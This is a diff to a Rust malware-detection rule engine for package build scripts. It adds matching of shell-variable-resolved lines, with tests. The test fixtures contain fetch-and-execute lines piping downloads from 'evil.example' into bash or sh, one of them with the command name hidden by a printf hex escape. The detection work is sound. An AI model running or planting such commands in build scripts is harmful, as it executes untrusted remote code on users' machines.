@@ -5,6 +5,7 @@ mod loader;
 pub use loader::RuleLoader;
 
 use crate::error::Result;
+use crate::resolve::resolve_variables;
 use crate::textutil::{
     deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
 };
@@ -282,6 +283,23 @@ impl RuleEngine {
         // obfuscated `bun add` fires ATOMIC-002). `None` for un-obfuscated lines,
         // so ordinary quoted strings are not re-matched.
         let deobf: Vec<Option<String>> = lines.iter().map(|(_, s)| deobfuscate(s)).collect();
+        // Variable-resolution variant (the static taint pass, audit HI-6): a
+        // payload hidden behind a shell variable (`x=curl; $x …| sh`,
+        // `c=$(printf '\x63url'); $c`) evades token matching. `resolve_variables`
+        // substitutes statically-evident assignments and is line-count-preserving,
+        // so the resolved logical line sits on its start physical line and aligns
+        // with `lines` by that line number. Like de-obfuscation it is matched *in
+        // addition to* the raw line, so it can only ADD a finding, never suppress.
+        let resolved_full = resolve_variables(content);
+        let resolved_phys: Vec<&str> = resolved_full.lines().collect();
+        let resolved: Vec<Option<String>> = lines
+            .iter()
+            .map(|(phys, raw)| {
+                resolved_phys.get(phys.saturating_sub(1)).and_then(|r| {
+                    (*r != raw.as_str() && !r.trim().is_empty()).then(|| (*r).to_string())
+                })
+            })
+            .collect();
         // Lines that are informational text printed to the user (the body of a
         // pure-printer heredoc, e.g. a `cat <<EOF` post_install message) are not
         // executed, so low-risk path-presence rules must not match them. A
@@ -301,6 +319,9 @@ impl RuleEngine {
                 }
 
                 for pattern in &compiled.compiled_patterns {
+                    // Try the raw line, then its de-obfuscated form, then its
+                    // variable-resolved form. Each variant is matched independently
+                    // and can only ADD a finding; the first hit per pattern wins.
                     if let Some(m) = self.match_pattern(pattern, line, &compiled.rule) {
                         matches.push(RuleMatch {
                             rule_id: compiled.rule.id.clone(),
@@ -309,8 +330,10 @@ impl RuleEngine {
                             matched_text: m.1,
                             context: line.clone(),
                         });
-                    } else if let Some(decoded) = &deobf[idx] {
-                        // Raw line didn't match, but its de-obfuscated form might.
+                        continue;
+                    }
+                    // Raw line didn't match, but its de-obfuscated form might.
+                    if let Some(decoded) = &deobf[idx] {
                         if let Some(m) = self.match_pattern(pattern, decoded, &compiled.rule) {
                             matches.push(RuleMatch {
                                 rule_id: compiled.rule.id.clone(),
@@ -318,6 +341,19 @@ impl RuleEngine {
                                 column: m.0,
                                 matched_text: m.1,
                                 context: format!("{line}    [de-obfuscated → {decoded}]"),
+                            });
+                            continue;
+                        }
+                    }
+                    // …or its variable-resolved form (a command hidden behind `$x`).
+                    if let Some(resolved_line) = &resolved[idx] {
+                        if let Some(m) = self.match_pattern(pattern, resolved_line, &compiled.rule) {
+                            matches.push(RuleMatch {
+                                rule_id: compiled.rule.id.clone(),
+                                line: *phys_line,
+                                column: m.0,
+                                matched_text: m.1,
+                                context: format!("{line}    [resolved → {resolved_line}]"),
                             });
                         }
                     }
@@ -2274,6 +2310,51 @@ mod tests {
         assert!(
             m.iter().any(|x| x.rule_id == "HIDDEN-001"),
             "a real write to ~/.bashrc must still trip HIDDEN-001: {m:?}"
+        );
+    }
+
+    #[test]
+    fn variable_indirection_command_is_resolved_and_flagged() {
+        // audit HI-6: a fetch-exec hidden behind a shell variable used to "trip
+        // nothing"; the resolve pass now exposes it to the catalog.
+        let engine = RuleEngine::default();
+        for content in [
+            "build() {\n  x=curl\n  $x https://evil.example/p.sh | bash\n}",
+            "build() {\n  dl=wget\n  $dl -qO- https://evil.example/p | sh\n}",
+        ] {
+            let m = engine.match_content(content, FileType::Pkgbuild);
+            assert!(
+                m.iter()
+                    .any(|x| x.rule_id == "DLE-001" || x.rule_id == "DLE-002"),
+                "variable-indirection fetch-exec must be flagged via resolve: {content:?} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn printf_constant_behind_variable_is_resolved() {
+        // `c=$(printf '\x63url')` decodes to `c=curl` (NO execution); the use then
+        // resolves to a curl|bash the catalog flags.
+        let engine = RuleEngine::default();
+        let content = "build() {\n  c=$(printf '\\x63url')\n  $c https://evil.example/x | bash\n}";
+        let m = engine.match_content(content, FileType::Pkgbuild);
+        assert!(
+            m.iter().any(|x| x.rule_id == "DLE-001"),
+            "printf-assembled command behind a var must resolve+flag: {m:?}"
+        );
+    }
+
+    #[test]
+    fn resolve_does_not_fabricate_findings_on_benign_vars() {
+        // FP guard: an ordinary constant assignment must not be rewritten into a
+        // fetch-exec finding.
+        let engine = RuleEngine::default();
+        let content = "build() {\n  msg=\"see https://example.com/docs\"\n  echo \"$msg\"\n}";
+        let m = engine.match_content(content, FileType::Pkgbuild);
+        assert!(
+            !m.iter()
+                .any(|x| x.rule_id.starts_with("DLE") || x.rule_id == "EXEC-REMOTE"),
+            "benign var assignment must not fabricate a fetch-exec finding: {m:?}"
         );
     }
 
